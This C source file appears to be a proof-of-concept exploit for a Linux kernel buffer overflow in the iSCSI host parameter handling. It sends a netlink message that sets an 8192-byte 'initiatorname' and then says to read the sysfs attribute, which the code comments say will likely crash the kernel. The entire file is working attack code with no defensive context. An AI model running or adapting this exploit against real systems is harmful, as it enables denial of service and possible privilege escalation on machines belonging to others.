#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/iscsi_ibft.h>
#include <scsi/scsi_bsg_iscsi.h>
#include <scsi/iscsi_if.h>

#define OVERFLOW_SIZE 8192 // Larger than PAGE_SIZE

int main(void) {
    int sock_fd;
    struct sockaddr_nl src_addr, dest_addr;
    struct nlmsghdr *nlh = NULL;
    struct iovec iov;
    struct msghdr msg;
    char *payload;

    // 1. Create a Netlink socket for iSCSI
    sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_ISCSI);
    if (sock_fd < 0) {
        perror("socket");
        return -1;
    }

    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.nl_family = AF_NETLINK;
    src_addr.nl_pid = getpid();
    bind(sock_fd, (struct sockaddr *)&src_addr, sizeof(src_addr));

    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.nl_family = AF_NETLINK;
    dest_addr.nl_pid = 0; // To kernel
    dest_addr.nl_groups = 0;

    // 2. Prepare the payload with an oversized string
    // This will be used to set the 'initiatorname'
    payload = malloc(NLMSG_SPACE(sizeof(struct iscsi_uevent) + OVERFLOW_SIZE));
    if (!payload) {
        perror("malloc");
        close(sock_fd);
        return -1;
    }

    nlh = (struct nlmsghdr *)payload;
    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(struct iscsi_uevent) + OVERFLOW_SIZE);
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = 0;
    nlh->nlmsg_type = ISCSI_UEVENT_SET_HOST_PARAM;

    struct iscsi_uevent *ev = NLMSG_DATA(nlh);
    ev->transport_handle = 1; // Target a transport
    ev->u.set_host_param.host_no = 0; // Target host0
    ev->u.set_host_param.param = ISCSI_HOST_PARAM_INITIATOR_NAME;
    ev->u.set_host_param.len = OVERFLOW_SIZE;

    char *data = (char *)ev + sizeof(*ev);
    memset(data, 'A', OVERFLOW_SIZE); // Fill with 'A's

    iov.iov_base = (void *)nlh;
    iov.iov_len = nlh->nlmsg_len;
    msg.msg_name = (void *)&dest_addr;
    msg.msg_namelen = sizeof(dest_addr);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    // 3. Send the message to the kernel to set the oversized parameter
    printf("Sending Netlink message to set oversized initiatorname...\n");
    sendmsg(sock_fd, &msg, 0);
    close(sock_fd);
    free(payload);

    // 4. Trigger the overflow by reading the sysfs attribute
    printf("Triggering overflow by reading from sysfs. This will likely crash the kernel.\n");
    printf("Run: cat /sys/class/iscsi_host/host0/initiatorname\n");
    // The following system call would trigger it directly:
    // system("cat /sys/class/iscsi_host/host0/initiatorname");

    return 0;
}
